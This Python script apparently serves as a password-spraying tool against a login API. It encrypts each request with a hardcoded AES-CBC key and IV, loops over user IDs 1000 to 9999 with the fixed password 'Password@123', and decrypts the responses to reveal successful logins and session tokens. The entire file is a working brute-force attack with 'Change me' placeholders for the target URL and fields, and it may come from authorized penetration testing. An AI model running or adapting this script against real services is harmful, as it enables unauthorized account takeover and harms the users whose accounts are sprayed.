#run in cmd or terminal : python3 request-response.py
#or
#python3 request-response.py >> output.txt

from hashlib import md5
from base64 import b64decode
from base64 import b64encode
import requests
import json

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

key = b"1234567812345678"
iv = b"12345678ABCDEFGH"

def encrypt(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(data.encode('utf-8'),AES.block_size))
    return b64encode(ciphertext).decode('utf-8')

def decrypt(data):
    raw = b64decode(data)
    cipher = AES.new(key, AES.MODE_CBC,iv)
    decrypted_data = unpad(cipher.decrypt(raw), AES.block_size)
    return decrypted_data.decode('utf-8')


def spray(id):
    print("Using id : %s" %id)
    password = "Password@123"
    print("\n")
    url = "https://prod-api.website.com/api/v1/user/auth/login" #Change me
    headers = {'Accept': 'application/json, text/plain, */*','Content-Type': 'application/json'}
    #Sample value of 'req' key : {"username":"1234","password":"Password@123","requestId":"12345"}
    #Sample encrypted 'req' : YB+qJHLtW0yMzWmlca062aXbNPMJRNfTbAr2rio05epnqolGRRwzxUQMav1DaQ5WIFWSda75UkR5KsyoxGwG/hycfjmDr1x1/HM0AhXvg34= 
    plainbody = '{"username":"' + id + '","password":"'+ password +'","requestId":"1234"}' #Change me
    print("Plainbody sent in POST : %s" %(plainbody))
    encryptedbody = encrypt(plainbody)
    # Below 'data' is the body sent via POST request
    data = {"guid":"","req":encryptedbody} #Change me
    print("Encrypted POST body sent : %s" %(data))
    req = requests.post(url,data=json.dumps(data),headers=headers)
    response = req.json()
    #If the response is json, then below snippet can be used to decrypt and output individual keys.
    #For example : Sample response : {"responseid":"","data":"lh3JSeesSTFmVJyTbtnKxjiHrfS/PuZpYjLemB3LF5jQ1w34w70fkT0N4DPFgBsMuKrOW9Odbs0AsqpkE9cwyJO6qxphuOkFFGtD1Cxg0iEamK0UxOxsma/CwH9ZKIz11nmCFiFsEOhECy2FgaFMXcoucchqIHnP06WOrHijfstUV8q3XrlrM3alve3Iicw7"}
    #Sample decrypted response for key 'data' : {"resultInfo":{"resultStatus":"1","resultCode":"Success","resultMsg":"Login successful","SessionToken":"abcdefghi","RequestId":"1234"}}
    for key in response:
        print("\n")
        #print("Printing Decrypted Response...")
        #print(key,":",decrypt(response[key]))
        #print("\n")
        if key == "data": #Change me
            print("Printing decrypted data...")
            print(key,":",decrypt(response[key]))
            length_data = len(decrypt(response[key]))
            print("Length of decrypted data : %s" %length_data)
            print("\n")
            break


#print(spray("1343")) #For debuggung

#Conducting password spray on userids between 1000 to 9999
for i in range(1000,9999):
    print(spray(str(i)))
